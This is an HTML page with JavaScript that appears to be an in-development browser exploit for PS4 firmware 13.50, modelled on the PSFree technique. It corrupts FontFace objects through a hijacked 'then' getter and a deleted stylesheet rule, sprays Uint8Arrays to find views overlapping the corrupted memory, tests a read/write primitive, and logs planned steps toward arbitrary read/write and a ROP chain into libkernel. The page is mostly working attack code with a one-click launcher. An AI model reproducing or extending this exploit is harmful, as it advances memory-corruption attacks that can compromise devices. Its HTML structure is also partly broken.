<!DOCTYPE html>
<html>
<head>

<style>

    .success { color: #00ff41; font-weight: bold; }

<body>

<div class="container">
    <div class="header">
        <h1>◈ MEMORY OVERLAP SPRAY ◈</h1>
        <div class="subtitle">FontFace Corruption + Uint8Array Spray (PSFree technique)</div>
    </div>
    
    <button class="btn" onclick="runExploit()">► SPRAY MEMORY</button>
    
    <div class="log-container">
        <div class="log-header">◈ EXPLOIT LOG ◈</div>
        <div id="log"></div>
    </div>
</div>

<script>
"use strict";

let logBuf = [];

function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.innerHTML = logBuf.map(line => {
            let className = '';
            if (line.includes('[+++]')) className = 'success';
            else if (line.includes('[ERROR]')) className = 'error';
            else if (line.includes('[!]')) className = 'warning';
            else if (line.includes('[+]')) className = 'info';
            else if (line.includes('0x')) className = 'highlight';
            
            return `<span class="${className}">${line}</span>`;
        }).join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return new Float64Array(buf)[0];
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
    
    read32(u8view, offset) {
        return (
            u8view[offset]
            | u8view[offset + 1] << 8
            | u8view[offset + 2] << 16
            | u8view[offset + 3] << 24
        ) >>> 0;
    }
    
    read64(u8view, offset) {
        let low = this.read32(u8view, offset);
        let high = this.read32(u8view, offset + 4);
        return new Int64(low, high);
    }
}

// Size to spray (similar to PSFree's ssv_len)
// Try different sizes to match different structures
const SPRAY_SIZES = [0x50, 0x48, 0x58, 0x100, 0x200];

const LIBKERNEL_BASE = new Int64(0x75C00000, 0x7F8B49F3);

function runExploit() {
    logBuf = [];
    
    log('═══════════════════════════════════════════════════════');
    log('  PS4 13.50 - MEMORY OVERLAP SPRAY (PSFree technique)   ');
    log('═══════════════════════════════════════════════════════\n');
    
    log('[STRATEGY] FontFace corruption + Uint8Array spray');
    log('[GOAL] Find Uint8Array that overlaps corrupted memory\n');
    
    // Setup
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    // Create confusion arrays
    let floatArray = new Float64Array(100);
    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {
        floatArray[i] = 1.1 * (i + 1);
        objectArray[i] = { id: i };
    }
    
    log('[SETUP] Created confusion arrays\n');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
                
                // Create corrupted fonts
                let corrupted = [];
                for (let i = 0; i < 50; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                
                log('[CORRUPTION] ✓ FontFace corruption triggered');
                log('[CORRUPTION] ' + corrupted.length + ' fonts corrupted\n');
                
                // Required setup
                log('[SETUP] Tests 1-3...');
                try {
                    corrupted[0].status;
                    corrupted[1].p = {x:1};
                    floatArray[50] = corrupted[2];
                    log('[SETUP] ✓\n');
                } catch(e) {
                    log('[SETUP] ! Error: ' + e.message + '\n');
                }
                
                // ═══════════════════════════════════════════
                // UINT8ARRAY SPRAY (like PSFree)
                // ═══════════════════════════════════════════
                
                log('[PHASE 2] ▼▼▼ UINT8ARRAY SPRAY ▼▼▼\n');
                
                // Try different sizes
                for (let sizeIdx = 0; sizeIdx < SPRAY_SIZES.length; sizeIdx++) {
                    let spraySize = SPRAY_SIZES[sizeIdx];
                    
                    log('[SIZE ' + hex(spraySize) + '] Spraying Uint8Arrays...\n');
                    
                    let views = [];
                    let markerValue = 0x41 + sizeIdx;
                    
                    // Spray many Uint8Arrays (like PSFree does)
                    for (let i = 0; i < 0x300; i++) {
                        let view = new Uint8Array(new ArrayBuffer(spraySize));
                        
                        // Fill with marker
                        view[0] = markerValue;
                        view[1] = markerValue;
                        view[2] = markerValue;
                        view[3] = markerValue;
                        
                        // Also write index
                        view[4] = i & 0xFF;
                        view[5] = (i >> 8) & 0xFF;
                        
                        views.push(view);
                    }
                    
                    log('[*] Sprayed ' + views.length + ' views of size ' + hex(spraySize));
                    log('[*] Marker: ' + hex(markerValue));
                    log('[*] Checking for overlaps...\n');
                    
                    // Check which views got corrupted (marker changed)
                    let overlaps = [];
                    
                    for (let i = 0; i < views.length; i++) {
                        let view = views[i];
                        
                        // Check if marker changed
                        if (view[0] !== markerValue || 
                            view[1] !== markerValue ||
                            view[2] !== markerValue ||
                            view[3] !== markerValue) {
                            
                            log('[OVERLAP] View ' + i + ' marker changed!');
                            log('  Expected: ' + hex(markerValue));
                            log('  Got: ' + hex(view[0]) + ' ' + hex(view[1]) + ' ' + hex(view[2]) + ' ' + hex(view[3]));
                            
                            overlaps.push({view: view, index: i});
                        }
                    }
                    
                    if (overlaps.length > 0) {
                        log('\n[+++] FOUND ' + overlaps.length + ' OVERLAPPING VIEWS!\n');
                        
                        // Analyze each overlap
                        for (let j = 0; j < Math.min(3, overlaps.length); j++) {
                            let overlap = overlaps[j];
                            let view = overlap.view;
                            
                            log('[OVERLAP ' + j + '] View index ' + overlap.index + ':');
                            log('[DUMP] First 64 bytes:');
                            
                            let dumpStr = '';
                            for (let off = 0; off < 64; off++) {
                                if (off % 16 === 0) {
                                    if (off > 0) log(dumpStr);
                                    dumpStr = '  +' + hex(off) + ': ';
                                }
                                dumpStr += view[off].toString(16).padStart(2, '0') + ' ';
                            }
                            log(dumpStr);
                            
                            // Try to read as pointers
                            log('[POINTERS] Looking for addresses:');
                            let helper = new Int64(0, 0);
                            
                            for (let off = 0; off < Math.min(spraySize - 8, 128); off += 8) {
                                let addr = helper.read64(view, off);
                                
                                // Look for userspace pointers
                                if (addr.high >= 0x01000000 && addr.high <= 0x7fffffff) {
                                    log('  +' + hex(off) + ': ' + addr.toString() + ' [POINTER]');
                                } else if (addr.low !== 0 || addr.high !== 0) {
                                    // Non-zero value
                                    if (off < 32) { // Only log first few non-zero
                                        log('  +' + hex(off) + ': ' + addr.toString());
                                    }
                                }
                            }
                            
                            log('');
                        }
                        
                        // ═══════════════════════════════════════════
                        // TEST READ/WRITE
                        // ═══════════════════════════════════════════
                        
                        log('[PHASE 3] ▼▼▼ TEST READ/WRITE ▼▼▼\n');
                        
                        let testView = overlaps[0].view;
                        
                        log('[*] Using first overlapping view for R/W test');
                        log('[*] Original first 8 bytes: ');
                        let origStr = '';
                        for (let i = 0; i < 8; i++) {
                            origStr += hex(testView[i]) + ' ';
                        }
                        log('    ' + origStr);
                        
                        // Try to write
                        log('[*] Writing test pattern 0xDEADBEEF...');
                        testView[0] = 0xEF;
                        testView[1] = 0xBE;
                        testView[2] = 0xAD;
                        testView[3] = 0xDE;
                        
                        // Read back
                        log('[*] Reading back:');
                        let readStr = '';
                        for (let i = 0; i < 8; i++) {
                            readStr += hex(testView[i]) + ' ';
                        }
                        log('    ' + readStr);
                        
                        if (testView[0] === 0xEF && testView[1] === 0xBE && 
                            testView[2] === 0xAD && testView[3] === 0xDE) {
                            log('[+++] WRITE SUCCESSFUL!');
                            log('[+++] READ/WRITE PRIMITIVE WORKING!');
                            log('[+++] Can now manipulate corrupted memory!\n');
                            
                            log('[NEXT STEPS]');
                            log('  1. Identify what structure this view overlaps');
                            log('  2. Corrupt strategic fields (like StringImpl length)');
                            log('  3. Build OOB read primitive');
                            log('  4. Leak more addresses');
                            log('  5. Build arbitrary R/W');
                            log('  6. Write ROP to libkernel ' + LIBKERNEL_BASE.toString());
                        }
                        
                        // Don't try other sizes if we found overlap
                        break;
                    }
                    
                    log('');
                }
                
                // ═══════════════════════════════════════════
                // ANALYSIS
                // ═══════════════════════════════════════════
                
                log('\n╔════════════════════════════════════════════════╗');
                log('║              ANALYSIS                          ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                log('[RESULTS]');
                log('  Check above for OVERLAPPING VIEWS');
                log('  Check if marker bytes changed');
                log('  Check for leaked pointers\n');
                
                log('[IF SUCCESSFUL]');
                log('  Found Uint8Array overlapping corrupted memory');
                log('  Can read/write via that view');
                log('  This is similar to PSFree\'s initial primitive');
                log('  Can build full exploit from here\n');
                
                log('[IF UNSUCCESSFUL]');
                log('  No views overlapped corrupted memory');
                log('  May need different spray sizes');
                log('  Or FontFace bug doesn\'t free/corrupt right memory');
                
                log('\n[!] Returning - OOM will occur');
                log('═══════════════════════════════════════════════════════\n');
            }
            
            return undefined;
        }
    });
    
    log('[*] Starting exploit...\n');
    document.fonts.load('1em x', 'AB');
}

log('═══════════════════════════════════════════════════════');
log('      MEMORY OVERLAP SPRAY READY (PSFree)              ');
log('═══════════════════════════════════════════════════════\n');
log('[INFO] Technique: Corrupt memory + spray Uint8Arrays');
log('[INFO] Goal: Find view that overlaps corrupted memory\n');
log('[READY] Click SPRAY MEMORY\n');

</script>
</body>
